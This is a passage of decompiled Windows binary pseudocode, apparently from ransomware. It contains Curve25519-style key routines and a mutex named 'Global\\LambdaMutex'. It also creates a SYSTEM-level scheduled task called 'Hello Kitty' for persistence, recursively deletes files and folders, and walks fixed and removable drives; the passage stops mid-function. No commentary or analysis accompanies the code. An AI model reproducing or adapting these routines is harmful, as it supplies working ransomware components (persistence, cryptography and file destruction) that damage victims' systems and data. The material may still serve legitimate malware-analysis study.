  v15 = -a3 & (v14 ^ v13);
  *((_QWORD *)a2 + 3) = v15 ^ v14;
  v16 = v15 ^ a1[6];
  v17 = a1[8];
  *((_QWORD *)a1 + 3) = v16;
  v18 = a2[8];
  v19 = -a3 & (v18 ^ v17);
  *((_QWORD *)a2 + 4) = v19 ^ v18;
  v20 = v19 ^ a1[8];
  v21 = a1[10];
  *((_QWORD *)a1 + 4) = v20;
  v22 = a2[10];
  v23 = -a3 & (v22 ^ v21);
  *((_QWORD *)a2 + 5) = v23 ^ v22;
  v24 = v23 ^ a1[10];
  v25 = a1[12];
  *((_QWORD *)a1 + 5) = v24;
  v26 = a2[12];
  v27 = -a3 & (v26 ^ v25);
  *((_QWORD *)a2 + 6) = v27 ^ v26;
  v28 = v27 ^ a1[12];
  v29 = a1[14];
  *((_QWORD *)a1 + 6) = v28;
  v30 = a2[14];
  v31 = -a3 & (v30 ^ v29);
  *((_QWORD *)a2 + 7) = v31 ^ v30;
  v32 = v31 ^ a1[14];
  v33 = a1[16];
  *((_QWORD *)a1 + 7) = v32;
  v34 = a2[16];
  v35 = -a3 & (v34 ^ v33);
  *((_QWORD *)a2 + 8) = v35 ^ v34;
  v36 = v35 ^ a1[16];
  v37 = a1[18];
  *((_QWORD *)a1 + 8) = v36;
  v38 = a2[18];
  v39 = -a3 & (v38 ^ v37);
  *((_QWORD *)a2 + 9) = v39 ^ v38;
  result = v39 ^ a1[18];
  *((_QWORD *)a1 + 9) = result;
  return result;
}

//----- (004070D0) --------------------------------------------------------
__m128i *__usercall sub_4070D0@<eax>(int a1@<edx>, _OWORD *a2@<ecx>, int a3, int a4)
{
  unsigned __int8 *v4; // esi
  __int128 v5; // xmm0
  unsigned __int8 v6; // al
  char *v7; // esi
  int v8; // ebx
  __m128i *v9; // edi
  __m128i *v10; // ebx
  __int32 *v11; // ecx
  char *v12; // eax
  bool v13; // zf
  int *v14; // eax
  _OWORD *v15; // ecx
  __int128 v16; // xmm0
  __m128i *result; // eax
  int v18; // [esp-10h] [ebp-518h]
  char v19[152]; // [esp+10h] [ebp-4F8h] BYREF
  char v20[152]; // [esp+A8h] [ebp-460h] BYREF
  char v21[152]; // [esp+140h] [ebp-3C8h] BYREF
  int v22[38]; // [esp+1D8h] [ebp-330h] BYREF
  int v23[38]; // [esp+270h] [ebp-298h] BYREF
  int v24[38]; // [esp+308h] [ebp-200h] BYREF
  int v25[38]; // [esp+3A0h] [ebp-168h] BYREF
  _QWORD v26[19]; // [esp+438h] [ebp-D0h] BYREF
  __m128i *v27; // [esp+4D0h] [ebp-38h]
  _OWORD *v28; // [esp+4D4h] [ebp-34h]
  int v29; // [esp+4D8h] [ebp-30h]
  int v30; // [esp+4DCh] [ebp-2Ch]
  int v31; // [esp+4E0h] [ebp-28h]
  int *v32; // [esp+4E4h] [ebp-24h]
  int *v33; // [esp+4E8h] [ebp-20h]
  int *v34; // [esp+4ECh] [ebp-1Ch]
  __m128i *v35; // [esp+4F0h] [ebp-18h]
  __m128i *v36; // [esp+4F4h] [ebp-14h]
  __m128i *v37; // [esp+4F8h] [ebp-10h]
  __m128i *v38; // [esp+4FCh] [ebp-Ch]
  char *v39; // [esp+500h] [ebp-8h]
  unsigned __int8 v40; // [esp+507h] [ebp-1h]

  v27 = (__m128i *)a1;
  v28 = a2;
  memset(&v26[10], 0, 0x48u);
  v25[0] = 1;
  memset(&v25[1], 0, 148);
  v24[0] = 1;
  memset(&v24[1], 0, 148);
  memset(v21, 0, sizeof(v21));
  v37 = (__m128i *)v26;
  v35 = (__m128i *)v25;
  v32 = v24;
  v38 = (__m128i *)v21;
  memset(v20, 0, sizeof(v20));
  v23[0] = 1;
  memset(&v23[1], 0, 148);
  memset(v19, 0, sizeof(v19));
  v22[0] = 1;
  memset(&v22[1], 0, 148);
  v36 = (__m128i *)v20;
  v33 = v23;
  v39 = v19;
  v34 = v22;
  *(_OWORD *)v26 = *(_OWORD *)a4;
  *(_OWORD *)&v26[2] = *(_OWORD *)(a4 + 16);
  v4 = (unsigned __int8 *)(a3 + 31);
  v29 = 32;
  v5 = *(_OWORD *)(a4 + 32);
  v30 = a3 + 31;
  *(_OWORD *)&v26[4] = v5;
  *(_OWORD *)&v26[6] = *(_OWORD *)(a4 + 48);
  *(_OWORD *)&v26[8] = *(_OWORD *)(a4 + 64);
  do
  {
    v6 = *v4;
    v7 = (char *)v32;
    v40 = v6;
    v31 = 8;
    do
    {
      v8 = v6 >> 7;
      sub_406F80(v37, v7, v8);
      sub_406F80(v35, v38, v8);
      sub_4067E0(v34, v39, v36, (int)v33, (int)v7, v38, (int)v37, v35, (int *)a4);
      sub_406F80(v36, v39, v8);
      v9 = (__m128i *)v33;
      v18 = v8;
      v10 = (__m128i *)v34;
      sub_406F80(v33, v34, v18);
      v11 = (__int32 *)v36;
      v12 = v7;
      v7 = v39;
      v39 = v12;
      v34 = (int *)v38;
      v36 = v37;
      v33 = (int *)v35;
      v6 = 2 * v40;
      v38 = v10;
      v13 = v31-- == 1;
      v37 = (__m128i *)v11;
      v35 = v9;
      v40 *= 2;
    }
    while ( !v13 );
    v32 = (int *)v7;
    v4 = (unsigned __int8 *)(v30 - 1);
    v13 = v29-- == 1;
    --v30;
  }
  while ( !v13 );
  v14 = v32;
  v15 = v28;
  *v28 = *(_OWORD *)v32;
  v15[1] = *((_OWORD *)v14 + 1);
  v15[2] = *((_OWORD *)v14 + 2);
  v15[3] = *((_OWORD *)v14 + 3);
  v16 = *((_OWORD *)v14 + 4);
  result = v27;
  v15[4] = v16;
  *result = *v10;
  result[1] = v10[1];
  result[2] = v10[2];
  result[3] = v10[3];
  result[4] = v10[4];
  return result;
}

//----- (00407390) --------------------------------------------------------
int __fastcall sub_407390(_OWORD *a1, int *a2)
{
  int v4; // esi
  int v5; // esi
  int v6; // esi
  int v7; // esi
  int v8; // esi
  int v9; // esi
  int result; // eax
  __int128 v11[5]; // [esp+8h] [ebp-400h] BYREF
  __int128 v12[5]; // [esp+58h] [ebp-3B0h] BYREF
  __int128 v13[5]; // [esp+A8h] [ebp-360h] BYREF
  __int128 v14[5]; // [esp+F8h] [ebp-310h] BYREF
  __int128 v15[5]; // [esp+148h] [ebp-2C0h] BYREF
  __int128 v16[5]; // [esp+198h] [ebp-270h] BYREF
  __int128 v17[5]; // [esp+1E8h] [ebp-220h] BYREF
  __int128 v18; // [esp+238h] [ebp-1D0h] BYREF
  __int128 v19; // [esp+248h] [ebp-1C0h]
  __int128 v20; // [esp+258h] [ebp-1B0h]
  __int128 v21; // [esp+268h] [ebp-1A0h]
  _QWORD v22[11]; // [esp+278h] [ebp-190h] BYREF
  __int128 v23; // [esp+2D0h] [ebp-138h] BYREF
  __int128 v24; // [esp+2E0h] [ebp-128h]
  __int128 v25; // [esp+2F0h] [ebp-118h]
  __int128 v26; // [esp+300h] [ebp-108h]
  __int128 v27; // [esp+310h] [ebp-F8h]
  __int128 v28; // [esp+320h] [ebp-E8h] BYREF
  __int128 v29; // [esp+330h] [ebp-D8h]
  __int128 v30; // [esp+340h] [ebp-C8h]
  __int128 v31; // [esp+350h] [ebp-B8h]
  __int128 v32; // [esp+360h] [ebp-A8h]
  __int128 v33; // [esp+370h] [ebp-98h] BYREF
  __int128 v34; // [esp+380h] [ebp-88h]
  __int128 v35; // [esp+390h] [ebp-78h]
  __int128 v36; // [esp+3A0h] [ebp-68h]
  __int128 v37; // [esp+3B0h] [ebp-58h]

  sub_405BD0((int)&v18, a2);
  sub_4059E0(&v18);
  sub_405AC0(&v18);
  v15[0] = v18;
  v15[1] = v19;
  v15[2] = v20;
  v15[3] = v21;
  v15[4] = *(_OWORD *)v22;
  sub_405BD0((int)&v18, (int *)v15);
  sub_4059E0(&v18);
  sub_405AC0(&v18);
  v23 = v18;
  v24 = v19;
  v25 = v20;
  v26 = v21;
  v27 = *(_OWORD *)v22;
  sub_405BD0((int)&v18, (int *)&v23);
  sub_4059E0(&v18);
  sub_405AC0(&v18);
  v28 = v18;
  v29 = v19;
  v30 = v20;
  v31 = v21;
  v32 = *(_OWORD *)v22;
  sub_405510((int *)&v28, &v33, a2);
  sub_4059E0(&v33);
  sub_405AC0(&v33);
  v14[0] = v33;
  v14[1] = v34;
  v14[2] = v35;
  v14[3] = v36;
  v14[4] = v37;
  sub_405510((int *)v14, &v33, (int *)v15);
  sub_4059E0(&v33);
  sub_405AC0(&v33);
  *(_OWORD *)&v22[1] = v33;
  *(_OWORD *)&v22[3] = v34;
  *(_OWORD *)&v22[5] = v35;
  *(_OWORD *)&v22[7] = v36;
  *(_OWORD *)&v22[9] = v37;
  sub_405BD0((int)&v33, (int *)&v22[1]);
  sub_4059E0(&v33);
  sub_405AC0(&v33);
  v28 = v33;
  v29 = v34;
  v30 = v35;
  v31 = v36;
  v32 = v37;
  sub_405510((int *)&v28, &v33, (int *)v14);
  sub_4059E0(&v33);
  sub_405AC0(&v33);
  v13[0] = v33;
  v13[1] = v34;
  v13[2] = v35;
  v13[3] = v36;
  v13[4] = v37;
  sub_405BD0((int)&v33, (int *)v13);
  sub_4059E0(&v33);
  sub_405AC0(&v33);
  v28 = v33;
  v29 = v34;
  v30 = v35;
  v31 = v36;
  v32 = v37;
  sub_405BD0((int)&v33, (int *)&v28);
  sub_4059E0(&v33);
  sub_405AC0(&v33);
  v23 = v33;
  v24 = v34;
  v25 = v35;
  v26 = v36;
  v27 = v37;
  sub_405BD0((int)&v33, (int *)&v23);
  sub_4059E0(&v33);
  sub_405AC0(&v33);
  v28 = v33;
  v29 = v34;
  v30 = v35;
  v31 = v36;
  v32 = v37;
  sub_405BD0((int)&v33, (int *)&v28);
  sub_4059E0(&v33);
  sub_405AC0(&v33);
  v23 = v33;
  v24 = v34;
  v25 = v35;
  v26 = v36;
  v27 = v37;
  sub_405BD0((int)&v33, (int *)&v23);
  sub_4059E0(&v33);
  sub_405AC0(&v33);
  v28 = v33;
  v29 = v34;
  v30 = v35;
  v31 = v36;
  v32 = v37;
  sub_405510((int *)&v28, &v33, (int *)v13);
  sub_4059E0(&v33);
  sub_405AC0(&v33);
  v17[0] = v33;
  v17[1] = v34;
  v17[2] = v35;
  v17[3] = v36;
  v17[4] = v37;
  sub_405BD0((int)&v33, (int *)v17);
  sub_4059E0(&v33);
  sub_405AC0(&v33);
  v28 = v33;
  v29 = v34;
  v30 = v35;
  v31 = v36;
  v32 = v37;
  sub_405BD0((int)&v33, (int *)&v28);
  sub_4059E0(&v33);
  sub_405AC0(&v33);
  v4 = 4;
  v23 = v33;
  v24 = v34;
  v25 = v35;
  v26 = v36;
  v27 = v37;
  do
  {
    sub_405BD0((int)&v33, (int *)&v23);
    sub_4059E0(&v33);
    sub_405AC0(&v33);
    v28 = v33;
    v29 = v34;
    v30 = v35;
    v31 = v36;
    v32 = v37;
    sub_405BD0((int)&v33, (int *)&v28);
    sub_4059E0(&v33);
    sub_405AC0(&v33);
    v23 = v33;
    v24 = v34;
    v25 = v35;
    v26 = v36;
    v27 = v37;
    --v4;
  }
  while ( v4 );
  sub_405510((int *)&v23, &v33, (int *)v17);
  sub_4059E0(&v33);
  sub_405AC0(&v33);
  v12[0] = v33;
  v12[1] = v34;
  v12[2] = v35;
  v12[3] = v36;
  v12[4] = v37;
  sub_405BD0((int)&v33, (int *)v12);
  sub_4059E0(&v33);
  sub_405AC0(&v33);
  v28 = v33;
  v29 = v34;
  v30 = v35;
  v31 = v36;
  v32 = v37;
  sub_405BD0((int)&v33, (int *)&v28);
  sub_4059E0(&v33);
  sub_405AC0(&v33);
  v5 = 9;
  v23 = v33;
  v24 = v34;
  v25 = v35;
  v26 = v36;
  v27 = v37;
  do
  {
    sub_405BD0((int)&v33, (int *)&v23);
    sub_4059E0(&v33);
    sub_405AC0(&v33);
    v28 = v33;
    v29 = v34;
    v30 = v35;
    v31 = v36;
    v32 = v37;
    sub_405BD0((int)&v33, (int *)&v28);
    sub_4059E0(&v33);
    sub_405AC0(&v33);
    v23 = v33;
    v24 = v34;
    v25 = v35;
    v26 = v36;
    v27 = v37;
    --v5;
  }
  while ( v5 );
  sub_405510((int *)&v23, &v33, (int *)v12);
  sub_4059E0(&v33);
  sub_405AC0(&v33);
  v28 = v33;
  v29 = v34;
  v30 = v35;
  v31 = v36;
  v32 = v37;
  sub_405BD0((int)&v33, (int *)&v28);
  sub_4059E0(&v33);
  sub_405AC0(&v33);
  v23 = v33;
  v24 = v34;
  v25 = v35;
  v26 = v36;
  v27 = v37;
  sub_405BD0((int)&v33, (int *)&v23);
  sub_4059E0(&v33);
  sub_405AC0(&v33);
  v6 = 4;
  v28 = v33;
  v29 = v34;
  v30 = v35;
  v31 = v36;
  v32 = v37;
  do
  {
    sub_405BD0((int)&v33, (int *)&v28);
    sub_4059E0(&v33);
    sub_405AC0(&v33);
    v23 = v33;
    v24 = v34;
    v25 = v35;
    v26 = v36;
    v27 = v37;
    sub_405BD0((int)&v33, (int *)&v23);
    sub_4059E0(&v33);
    sub_405AC0(&v33);
    v28 = v33;
    v29 = v34;
    v30 = v35;
    v31 = v36;
    v32 = v37;
    --v6;
  }
  while ( v6 );
  sub_405510((int *)&v28, &v33, (int *)v17);
  sub_4059E0(&v33);
  sub_405AC0(&v33);
  v16[0] = v33;
  v16[1] = v34;
  v16[2] = v35;
  v16[3] = v36;
  v16[4] = v37;
  sub_405BD0((int)&v33, (int *)v16);
  sub_4059E0(&v33);
  sub_405AC0(&v33);
  v28 = v33;
  v29 = v34;
  v30 = v35;
  v31 = v36;
  v32 = v37;
  sub_405BD0((int)&v33, (int *)&v28);
  sub_4059E0(&v33);
  sub_405AC0(&v33);
  v7 = 24;
  v23 = v33;
  v24 = v34;
  v25 = v35;
  v26 = v36;
  v27 = v37;
  do
  {
    sub_405BD0((int)&v33, (int *)&v23);
    sub_4059E0(&v33);
    sub_405AC0(&v33);
    v28 = v33;
    v29 = v34;
    v30 = v35;
    v31 = v36;
    v32 = v37;
    sub_405BD0((int)&v33, (int *)&v28);
    sub_4059E0(&v33);
    sub_405AC0(&v33);
    v23 = v33;
    v24 = v34;
    v25 = v35;
    v26 = v36;
    v27 = v37;
    --v7;
  }
  while ( v7 );
  sub_405510((int *)&v23, &v33, (int *)v16);
  sub_4059E0(&v33);
  sub_405AC0(&v33);
  v11[0] = v33;
  v11[1] = v34;
  v11[2] = v35;
  v11[3] = v36;
  v11[4] = v37;
  sub_405BD0((int)&v33, (int *)v11);
  sub_4059E0(&v33);
  sub_405AC0(&v33);
  v23 = v33;
  v24 = v34;
  v25 = v35;
  v26 = v36;
  v27 = v37;
  sub_405BD0((int)&v33, (int *)&v23);
  sub_4059E0(&v33);
  sub_405AC0(&v33);
  v8 = 49;
  v28 = v33;
  v29 = v34;
  v30 = v35;
  v31 = v36;
  v32 = v37;
  do
  {
    sub_405BD0((int)&v33, (int *)&v28);
    sub_4059E0(&v33);
    sub_405AC0(&v33);
    v23 = v33;
    v24 = v34;
    v25 = v35;
    v26 = v36;
    v27 = v37;
    sub_405BD0((int)&v33, (int *)&v23);
    sub_4059E0(&v33);
    sub_405AC0(&v33);
    v28 = v33;
    v29 = v34;
    v30 = v35;
    v31 = v36;
    v32 = v37;
    --v8;
  }
  while ( v8 );
  sub_405510((int *)&v28, &v33, (int *)v11);
  sub_4059E0(&v33);
  sub_405AC0(&v33);
  v23 = v33;
  v24 = v34;
  v25 = v35;
  v26 = v36;
  v27 = v37;
  sub_405BD0((int)&v33, (int *)&v23);
  sub_4059E0(&v33);
  sub_405AC0(&v33);
  v28 = v33;
  v29 = v34;
  v30 = v35;
  v31 = v36;
  v32 = v37;
  sub_405BD0((int)&v33, (int *)&v28);
  sub_4059E0(&v33);
  sub_405AC0(&v33);
  v9 = 24;
  v23 = v33;
  v24 = v34;
  v25 = v35;
  v26 = v36;
  v27 = v37;
  do
  {
    sub_405BD0((int)&v33, (int *)&v23);
    sub_4059E0(&v33);
    sub_405AC0(&v33);
    v28 = v33;
    v29 = v34;
    v30 = v35;
    v31 = v36;
    v32 = v37;
    sub_405BD0((int)&v33, (int *)&v28);
    sub_4059E0(&v33);
    sub_405AC0(&v33);
    v23 = v33;
    v24 = v34;
    v25 = v35;
    v26 = v36;
    v27 = v37;
    --v9;
  }
  while ( v9 );
  sub_405510((int *)&v23, &v33, (int *)v16);
  sub_4059E0(&v33);
  sub_405AC0(&v33);
  v28 = v33;
  v29 = v34;
  v30 = v35;
  v31 = v36;
  v32 = v37;
  sub_405BD0((int)&v33, (int *)&v28);
  sub_4059E0(&v33);
  sub_405AC0(&v33);
  v23 = v33;
  v24 = v34;
  v25 = v35;
  v26 = v36;
  v27 = v37;
  sub_405BD0((int)&v33, (int *)&v23);
  sub_4059E0(&v33);
  sub_405AC0(&v33);
  v28 = v33;
  v29 = v34;
  v30 = v35;
  v31 = v36;
  v32 = v37;
  sub_405BD0((int)&v33, (int *)&v28);
  sub_4059E0(&v33);
  sub_405AC0(&v33);
  v23 = v33;
  v24 = v34;
  v25 = v35;
  v26 = v36;
  v27 = v37;
  sub_405BD0((int)&v33, (int *)&v23);
  sub_4059E0(&v33);
  sub_405AC0(&v33);
  v28 = v33;
  v29 = v34;
  v30 = v35;
  v31 = v36;
  v32 = v37;
  sub_405BD0((int)&v33, (int *)&v28);
  sub_4059E0(&v33);
  sub_405AC0(&v33);
  v23 = v33;
  v24 = v34;
  v25 = v35;
  v26 = v36;
  v27 = v37;
  sub_405510((int *)&v23, &v33, (int *)&v22[1]);
  sub_4059E0(&v33);
  result = sub_405AC0(&v33);
  *a1 = v33;
  a1[1] = v34;
  a1[2] = v35;
  a1[3] = v36;
  a1[4] = v37;
  return result;
}

//----- (004087B0) --------------------------------------------------------
int __usercall sub_4087B0@<eax>(__m128i *a1@<edx>, int a2@<ecx>, unsigned __int8 *a3)
{
  __m128i v3; // xmm0
  int v6[20]; // [esp+4h] [ebp-1B4h] BYREF
  int v7[20]; // [esp+54h] [ebp-164h] BYREF
  __int128 v8[4]; // [esp+A4h] [ebp-114h] BYREF
  _OWORD v9[5]; // [esp+E4h] [ebp-D4h] BYREF
  __int128 v10[5]; // [esp+13Ch] [ebp-7Ch] BYREF
  __m128i v11; // [esp+194h] [ebp-24h] BYREF
  __m128i v12; // [esp+1A4h] [ebp-14h]

  v3 = *a1;
  v12 = a1[1];
  v11 = v3;
  v11.m128i_i8[0] = _mm_cvtsi128_si32(v3) & 0xF8;
  v12.m128i_i8[15] = _mm_cvtsi128_si32(_mm_srli_si128(v12, 15)) & 0x3F | 0x40;
  sub_405F50((int *)v9 + 2, a3);
  sub_4070D0((int)v10, v6, (int)&v11, (int)v9 + 8);
  sub_407390(v7, (int *)v10);
  sub_405510(v6, v8, v7);
  sub_4059E0(v8);
  sub_405AC0(v8);
  v10[0] = v8[0];
  v10[1] = v8[1];
  v10[2] = v8[2];
  v10[3] = v8[3];
  v10[4] = v9[0];
  sub_406250(a2, (int *)v10);
  return 0;
}
// 4087B0: using guessed type __m128i var_14;
// 4087B0: using guessed type int var_1B4[20];
// 4087B0: using guessed type int var_164[20];

//----- (004088A0) --------------------------------------------------------
void sub_4088A0()
{
  const void *i; // eax
  HANDLE FileW; // eax
  WCHAR Filename[260]; // [esp+0h] [ebp-20Ch] BYREF
  DWORD NumberOfBytesWritten; // [esp+208h] [ebp-4h] BYREF

  if ( dword_4308D8 )
  {
    NumberOfBytesWritten = 0;
    GetModuleFileNameW(0, Filename, 0x104u);
    PathRemoveFileSpecW(Filename);
    lstrcatW(Filename, L"\\LambdaDebug.txt");
    InitializeCriticalSection(&CriticalSection);
    for ( i = HeapAlloc(hHeap, 8u, 0x10000u); !i; i = HeapAlloc(hHeap, 8u, 0x10000u) )
      Sleep(0x64u);
    lpBuffer = i;
    FileW = CreateFileW(Filename, 0x40000000u, 1u, 0, 4u, 2u, 0);
    hObject = FileW;
    if ( FileW != (HANDLE)-1 )
    {
      SetFilePointer(FileW, 0, 0, 2u);
      WriteFile(hObject, L"==============\r\n", 0x20u, &NumberOfBytesWritten, 0);
    }
  }
}
// 42AA3C: using guessed type wchar_t asc_42AA3C[17];
// 4308D8: using guessed type int dword_4308D8;

//----- (00408990) --------------------------------------------------------
void __cdecl sub_408990(int a1, int a2)
{
  _DWORD *v2; // eax
  int v3; // edi
  int v4; // eax
  int *v5; // [esp-14h] [ebp-B4h]
  DWORD NumberOfBytesWritten; // [esp+Ch] [ebp-94h] BYREF
  struct _SYSTEMTIME SystemTime; // [esp+10h] [ebp-90h] BYREF
  WCHAR Buffer[64]; // [esp+20h] [ebp-80h] BYREF

  if ( dword_4308D8 && hObject != (HANDLE)-1 )
  {
    EnterCriticalSection(&CriticalSection);
    v5 = (int *)lpBuffer;
    v2 = sub_4011F0();
    v3 = sub_4148D6(*v2 | 1, v2[1], v5, 0x7FFF, a1, 0, (int)&a2);
    GetLocalTime(&SystemTime);
    v4 = wsprintfW(
           Buffer,
           L"[%hu-%hu-%hu %hu:%hu:%hu] ",
           SystemTime.wYear,
           SystemTime.wMonth,
           SystemTime.wDay,
           SystemTime.wHour,
           SystemTime.wMinute,
           SystemTime.wSecond);
    WriteFile(hObject, Buffer, 2 * v4, &NumberOfBytesWritten, 0);
    if ( v3 < 0 )
      v3 = -1;
    WriteFile(hObject, lpBuffer, 2 * v3, &NumberOfBytesWritten, 0);
    WriteFile(hObject, L"\r\n", 4u, &NumberOfBytesWritten, 0);
    LeaveCriticalSection(&CriticalSection);
  }
}
// 42AA60: using guessed type wchar_t asc_42AA60[3];
// 4308D8: using guessed type int dword_4308D8;

//----- (00408AA0) --------------------------------------------------------
void sub_408AA0()
{
  if ( dword_4308D8 )
  {
    if ( hObject != (HANDLE)-1 )
      CloseHandle(hObject);
    HeapFree(hHeap, 0, (LPVOID)lpBuffer);
    DeleteCriticalSection(&CriticalSection);
  }
}
// 4308D8: using guessed type int dword_4308D8;

//----- (00408AE0) --------------------------------------------------------
void sub_408AE0()
{
  HANDLE v0; // eax

  if ( dword_4309D0 )
  {
    v0 = OpenMutexW(0x1F0001u, 0, L"Global\\LambdaMutex");
    hMutex = v0;
    if ( v0 )
    {
      CloseHandle(v0);
      ExitProcess(0);
    }
    hMutex = CreateMutexW(0, 1, L"Global\\LambdaMutex");
  }
}
// 4309D0: using guessed type int dword_4309D0;

//----- (00408B30) --------------------------------------------------------
BOOL sub_408B30()
{
  BOOL result; // eax

  if ( dword_4309D0 )
  {
    ReleaseMutex(hMutex);
    return CloseHandle(hMutex);
  }
  return result;
}
// 4309D0: using guessed type int dword_4309D0;

//----- (00408B60) --------------------------------------------------------
HINSTANCE sub_408B60()
{
  HINSTANCE result; // eax
  WCHAR Parameters[512]; // [esp+0h] [ebp-608h] BYREF
  WCHAR Filename[260]; // [esp+400h] [ebp-208h] BYREF

  if ( !Parameter )
  {
    if ( dword_430910 )
    {
      GetModuleFileNameW(0, Filename, 0x104u);
      wsprintfW(
        Parameters,
        L"/c SCHTASKS.exe /Create /RU \"NT AUTHORITY\\SYSTEM\" /sc onstart /TN \"Hello Kitty\" /TR \"%ls\" /F",
        Filename);
      return ShellExecuteW(0, L"open", L"cmd.exe", Parameters, 0, 0);
    }
  }
  return result;
}
// 430910: using guessed type int dword_430910;

//----- (00408BD0) --------------------------------------------------------
HINSTANCE sub_408BD0()
{
  return ShellExecuteW(0, L"open", L"cmd.exe", L"/c SCHTASKS.exe /Delete /TN \"Hello Kitty\" /F", 0, 0);
}

//----- (00408BF0) --------------------------------------------------------
BOOL sub_408BF0()
{
  HANDLE CurrentProcess; // eax

  CurrentProcess = GetCurrentProcess();
  SetPriorityClass(CurrentProcess, 0x80u);
  return SetProcessShutdownParameters(0, 0);
}

//----- (00408C10) --------------------------------------------------------
__int16 __thiscall sub_408C10(char *this)
{
  char *v1; // esi
  char *v2; // edx
  char *v3; // ecx
  __int16 result; // ax
  int v5; // edx
  WCHAR *i; // ebx
  int v7; // ecx
  __int16 v8; // ax
  WCHAR *v9; // ecx
  WCHAR v10; // ax
  BOOL (__stdcall *v11)(HANDLE, DWORD, LPVOID); // esi
  unsigned int v12; // kr00_4
  unsigned int v13; // kr04_4
  wchar_t *j; // edi
  WCHAR *v15; // eax
  WCHAR v16; // cx
  WCHAR *cFileName; // esi
  int v18; // eax
  WCHAR v19; // cx
  struct _WIN32_FIND_DATAW FindFileData; // [esp+10h] [ebp-258h] BYREF
  SIZE_T dwBytes; // [esp+264h] [ebp-4h]

  v1 = this;
  v2 = this;
  v3 = this + 2;
  do
  {
    result = *(_WORD *)v2;
    v2 += 2;
  }
  while ( result );
  v5 = (v2 - v3) >> 1;
  if ( v5 )
  {
    dwBytes = 2 * v5 + 6;
    for ( i = (WCHAR *)HeapAlloc(hHeap, 8u, dwBytes); !i; i = (WCHAR *)HeapAlloc(hHeap, 8u, dwBytes) )
      Sleep(0x64u);
    v7 = (char *)i - v1;
    do
    {
      v8 = *(_WORD *)v1;
      v1 += 2;
      *(_WORD *)&v1[v7 - 2] = v8;
    }
    while ( v8 );
    v9 = i - 1;
    do
    {
      v10 = v9[1];
      ++v9;
    }
    while ( v10 );
    *(_DWORD *)v9 = 2752604;
    v9[2] = 0;
    dwBytes = (SIZE_T)FindFirstFileExW(i, FindExInfoStandard, &FindFileData, FindExSearchNameMatch, 0, 0);
    v11 = HeapFree;
    if ( dwBytes != -1 )
    {
      do
      {
        if ( FindFileData.cFileName[0] != 46 )
        {
          v12 = wcslen(FindFileData.cFileName);
          v13 = wcslen(i);
          for ( j = (wchar_t *)HeapAlloc(hHeap, 8u, 2 * (v13 + v12) + 2);
                !j;
                j = (wchar_t *)HeapAlloc(hHeap, 8u, 2 * (v13 + v12) + 2) )
          {
            Sleep(0x64u);
          }
          v15 = i;
          do
          {
            v16 = *v15++;
            *(WCHAR *)((char *)v15 + (char *)j - (char *)i - 2) = v16;
          }
          while ( v16 );
          cFileName = FindFileData.cFileName;
          v18 = (char *)wcsrchr(j, 0x2Au) - (char *)FindFileData.cFileName;
          do
          {
            v19 = *cFileName++;
            *(WCHAR *)((char *)cFileName + v18 - 2) = v19;
          }
          while ( v19 );
          if ( (GetFileAttributesW(j) & 0x10) != 0 )
          {
            sub_408C10(j);
            RemoveDirectoryW(j);
          }
          else
          {
            DeleteFileW(j);
          }
          v11 = HeapFree;
          HeapFree(hHeap, 0, j);
        }
      }
      while ( FindNextFileW((HANDLE)dwBytes, &FindFileData) );
      FindClose((HANDLE)dwBytes);
    }
    return v11(hHeap, 0, i);
  }
  return result;
}

//----- (00408E20) --------------------------------------------------------
void sub_408E20()
{
  BOOL (__stdcall *v0)(HANDLE, LPWIN32_FIND_DATAW); // edi
  DWORD LogicalDrives; // ebx
  int v2; // eax
  UINT DriveTypeW; // eax
  int v4; // esi
  int v5; // ecx
  __int16 v6; // ax
  __int16 *v7; // ecx
  __int16 v8; // ax
  HANDLE FirstFile; // ebx
  int v10; // ecx
  WCHAR v11; // ax
  WCHAR *cFileName; // edx
  unsigned int v14; // edx
  __int16 *v15; // edi
  __int16 v16; // ax
  __int16 *v17; // ecx
  __int16 v18; // ax
  HANDLE v19; // edi
  WCHAR *v20; // esi
  char *v21; // ecx
  WCHAR v22; // ax
  bool v23; // zf
  __int16 v24; // [esp+Eh] [ebp-87Ah] BYREF
  WCHAR FileName[260]; // [esp+10h] [ebp-878h] BYREF
  WCHAR RootPathName[259]; // [esp+218h] [ebp-670h] BYREF
  __int16 v27; // [esp+41Eh] [ebp-46Ah] BYREF
  WCHAR Str[260]; // [esp+420h] [ebp-468h] BYREF
  struct _WIN32_FIND_DATAW FindFileData; // [esp+628h] [ebp-260h] BYREF
  int v30; // [esp+87Ch] [ebp-Ch]
  int v31; // [esp+880h] [ebp-8h]
  DWORD v32; // [esp+884h] [ebp-4h]

  if ( dword_4308FC )
  {
    v0 = FindNextFileW;
    LogicalDrives = GetLogicalDrives();
    v2 = 65;
    v32 = LogicalDrives;
    v31 = 65;
    v30 = 26;
    do
    {
      if ( (LogicalDrives & 1) != 0 )
      {
        wsprintfW(RootPathName, L"%hc:\\", v2);
        DriveTypeW = GetDriveTypeW(RootPathName);
        if ( DriveTypeW == 3 || DriveTypeW == 2 )
        {
          v4 = 0;
          v5 = 0;
          do
          {
            v6 = RootPathName[v5++];
            FileName[v5 - 1] = v6;
          }
          while ( v6 );
          v7 = &v24;
          do
          {
            v8 = v7[1];
            ++v7;
          }
          while ( v8 );
          *(_DWORD *)v7 = 7471146;
          *((_DWORD *)v7 + 1) = 6488165;
          *((_DWORD *)v7 + 2) = 6488185;
          *((_DWORD *)v7 + 3) = 6619244;
          *((_DWORD *)v7 + 4) = 42;
          FirstFile = FindFirstFileExW(FileName, FindExInfoStandard, &FindFileData, FindExSearchNameMatch, 0, 0);
          if ( FirstFile != (HANDLE)-1 )
          {
            if ( (FindFileData.dwFileAttributes & 0x10) != 0 )
            {
LABEL_14:
              v10 = 0;
              do
              {
                v11 = RootPathName[v10++];
                Str[v10 - 1] = v11;
              }
              while ( v11 );
              cFileName = FindFileData.cFileName;
              while ( *cFileName++ )
                ;
              v14 = (char *)cFileName - (char *)FindFileData.cFileName;
              v15 = &v27;
              do
              {
                v16 = v15[1];
                ++v15;
              }
              while ( v16 );
              qmemcpy(v15, FindFileData.cFileName, v14);
              v4 = 1;
            }
            else
            {
              while ( v0(FirstFile, &FindFileData) )
              {
                if ( (FindFileData.dwFileAttributes & 0x10) != 0 )
                  goto LABEL_14;
              }
            }
            FindClose(FirstFile);
          }
          if ( v4 )
          {
            v17 = &v27;
            do
            {
              v18 = v17[1];
              ++v17;
            }
            while ( v18 );
            *(_DWORD *)v17 = 5439580;
            *((_DWORD *)v17 + 1) = 2752557;
            v17[4] = 0;
